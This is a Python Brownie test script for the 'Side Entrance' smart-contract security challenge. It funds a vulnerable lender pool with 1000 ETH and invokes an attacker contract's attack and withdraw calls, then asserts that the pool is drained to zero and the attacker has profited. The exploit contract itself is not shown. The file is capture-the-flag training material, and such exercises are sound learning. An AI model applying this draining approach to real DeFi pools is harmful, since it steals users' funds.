import pytest
from brownie import SideEntranceLenderPool, AttackSideEntrance
from brownie import accounts , Wei , exceptions

print("[Challenge] Side Entrance : \n")

deployer, user, attacker = None, None, None

ETHER_IN_POOL = Wei('1000 ether') # Pool has 1000 ETH in balance
Attacker_Initial_Eth_Balance = None

@pytest.fixture(scope="module")
def contracts():
    #-- SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE --#
    global deployer, attacker, Attacker_Initial_Eth_Balance
    deployer, attacker = accounts[0] ,accounts[1]

    contracts = {}

    pool = SideEntranceLenderPool.deploy( {"from":deployer} )
    Attacker_Initial_Eth_Balance = attacker.balance()
    # receiver =  FlashLoanReceiver.deploy( pool.address, {"from":deployer} )

    # Funding Pool with initial Ether
    pool.deposit({"from":deployer, "value": ETHER_IN_POOL })
    assert pool.balance() == ETHER_IN_POOL

    contracts['pool'] = pool

    yield contracts
        

    #---------** SUCCESS CONDITIONS **---------#
    # All ETH has been drained from the receiver

    assert pool.balance() == '0'
    
    # Not checking exactly how much is the final balance of the attacker,
    # because it'll depend on how much gas the attacker spends in the attack
    # If there were no gas costs, it would be balance before attack + ETHER_IN_POOL

    assert attacker.balance() > Attacker_Initial_Eth_Balance
    
def test_naive_receiver_challenge(contracts):
    #--*** CODE YOUR EXPLOIT HERE ***--#
    attack_side_entrance = AttackSideEntrance.deploy(contracts["pool"].address, {"from":attacker} )
    
    tx = attack_side_entrance.attack(ETHER_IN_POOL, {"from":attacker})
    tx.wait(1)

    tx = attack_side_entrance.withdraw({"from":attacker})
    tx.wait(1)

    #_________________________________#